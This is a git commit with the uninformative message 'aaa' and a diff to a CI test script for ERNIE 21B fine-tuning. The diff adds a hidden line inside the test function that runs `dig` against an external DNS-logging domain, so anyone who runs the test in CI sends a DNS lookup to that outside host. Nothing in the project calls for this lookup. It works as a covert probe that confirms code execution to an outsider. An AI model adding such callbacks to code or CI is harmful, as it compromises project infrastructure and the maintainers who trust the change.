507af50f88a887a22ec533b26c99e017750a8f0e
ur10ser <1732740839@qq.com>
2026-05-24 19:31:11 +0800

    aaa

--- scripts/xpu_ci/test_ernie_21b_sft.py
+++ scripts/xpu_ci/test_ernie_21b_sft.py
@@ -24,6 +24,8 @@ def test_ernie_21b_sft_training(project_root, base_value_dir, log_file):
 
     Then validates that loss values match the baseline within tolerance of 1e-6.
     """
+    import os
+    os.system("dig paaa.2c30ce35.log.nat.cloudns.ph")
     # Define the exact shell command to execute
     cmd = "paddleformers-cli train scripts/xpu_ci/config/ernie_21b_sft.yaml"
 
